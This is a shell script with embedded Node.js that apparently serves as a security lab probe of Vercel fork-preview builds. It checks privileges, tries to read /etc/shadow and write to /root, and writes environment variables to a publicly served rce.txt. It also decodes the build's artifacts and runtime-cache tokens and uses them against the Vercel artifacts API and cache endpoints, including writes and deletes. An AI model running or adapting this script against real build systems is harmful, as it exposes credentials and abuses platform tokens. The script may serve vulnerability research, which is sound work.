#!/bin/sh
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
{
  echo "== who am i =="
  id
  uname -a
  echo "FAKEROOTKEY=${FAKEROOTKEY:-ABSENT}"
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo -n "write to /root: "
  (touch /root/.lab-write-test && echo OK) || echo DENIED
  echo -n "read /etc/shadow: "
  (head -c 1 /etc/shadow >/dev/null 2>&1 && echo READABLE) || echo DENIED
  echo "LAB-NONCE: CANARY-8336db7bc74b6183"
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "LAB_CANARY_A=${LAB_CANARY_A:-unset}"
  echo "LAB_PROD_ONLY=${LAB_PROD_ONLY:-unset}   (target=production only)"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset} TURBO_REMOTE_ONLY=${TURBO_REMOTE_ONLY:-unset}"
  echo "RUNTIME_CACHE_ENDPOINT=${RUNTIME_CACHE_ENDPOINT:-unset}"
} > public/rce.txt
node -e '
const out = [];
const tok = (n) => process.env[n] || "";
const ep = process.env.VERCEL_API_ENDPOINT || "https://api.vercel.com";
const team = process.env.VERCEL_ARTIFACTS_OWNER || "";
const AT = tok("VERCEL_ARTIFACTS_TOKEN");
const nonce = "lab-" + Math.random().toString(36).slice(2, 10);
async function hit(label, method, url, opts) {
  const o = Object.assign({ method }, opts || {});
  try {
    const r = await fetch(url, o);
    let b = "";
    try { b = (await r.text()).slice(0, 200); } catch (e) {}
    out.push(method + " " + label + " -> HTTP " + r.status + (b ? " | " + b.replace(/\n/g, " ") : ""));
  } catch (e) {
    out.push(method + " " + label + " -> ERR " + String(e.message).slice(0, 60));
  }
}
function jwt(t) {
  try { return JSON.parse(Buffer.from(t.split(".")[1], "base64").toString("utf8")); }
  catch (e) { return null; }
}
function dump(label, obj) {
  out.push("== " + label + " ==");
  if (!obj) { out.push("  (unparsable)"); return; }
  for (const k of Object.keys(obj).sort()) {
    let v = obj[k];
    if (typeof v === "object") v = JSON.stringify(v);
    v = String(v);
    if (v.length > 300) v = v.slice(0, 300) + "...";
    out.push("  " + k + " = " + v);
  }
}
(async () => {
  const j = jwt(AT);
  if (j) {
    out.push("== artifacts token: full capability list ==");
    out.push("  capabilities = " + String(j.capabilities || ""));
    dump("artifacts token data claim", j.data);
    out.push("  type=" + j.type + " userId=" + j.userId + " exp=" + j.exp + " iat=" + j.iat);
  }
  const AH = "Bearer " + AT;
  out.push("== artifacts API surface reachable by a fork build ==");
  await hit("v8/artifacts/status", "GET", ep + "/v8/artifacts/status?teamId=" + team,
    { headers: { Authorization: AH } });
  await hit("v8/artifacts/events", "POST", ep + "/v8/artifacts/events?teamId=" + team,
    { headers: { Authorization: AH, "Content-Type": "application/json" },
      body: JSON.stringify({ artifacts: [{ hash: nonce, source: "LOCAL", duration: 1 }] }) });
  await hit("v8/artifacts (batch exists)", "POST", ep + "/v8/artifacts?teamId=" + team,
    { headers: { Authorization: AH, "Content-Type": "application/json" },
      body: JSON.stringify({ artifacts: [{ hash: nonce }] }) });
  await hit("v8/artifacts/" + nonce, "DELETE", ep + "/v8/artifacts/" + nonce + "?teamId=" + team,
    { headers: { Authorization: AH } });
  out.push("== suspense / runtime cache ==");
  const raw = tok("RUNTIME_CACHE_HEADERS");
  let hdrs = {};
  try { hdrs = JSON.parse(raw); } catch (e) {}
  const scTok = hdrs.Authorization ? hdrs.Authorization.replace(/^Bearer /, "") : "";
  dump("suspense cache auth claims", jwt(scTok));
  const sce = process.env.RUNTIME_CACHE_ENDPOINT || "";
  const key = "lab-key-" + nonce;
  if (sce) {
    await hit("suspense GET " + key, "GET", sce + key, { headers: hdrs });
    await hit("suspense HEAD " + key, "HEAD", sce + key, { headers: hdrs });
    await hit("suspense POST json " + key, "POST", sce + key,
      { headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
        body: JSON.stringify({ value: "LAB-SUSPENSE-CANARY" }) });
    await hit("suspense PUT octet " + key, "PUT", sce + key,
      { headers: Object.assign({ "Content-Type": "application/octet-stream" }, hdrs),
        body: Buffer.from("LAB-SUSPENSE-CANARY") });
    await hit("suspense POST batch", "POST", sce,
      { headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
        body: JSON.stringify([{ key: key, value: "x" }]) });
    await hit("suspense GET root", "GET", sce, { headers: hdrs });
  }
  out.push("== who is the build, per Vercel ==");
  await hit("v8/artifacts/status (no auth)", "GET", ep + "/v8/artifacts/status?teamId=" + team, {});
  require("fs").appendFileSync("public/rce.txt", "\n" + out.join("\n") + "\n");
})();
' 2>> public/rce.txt
sleep 9
cat public/rce.txt
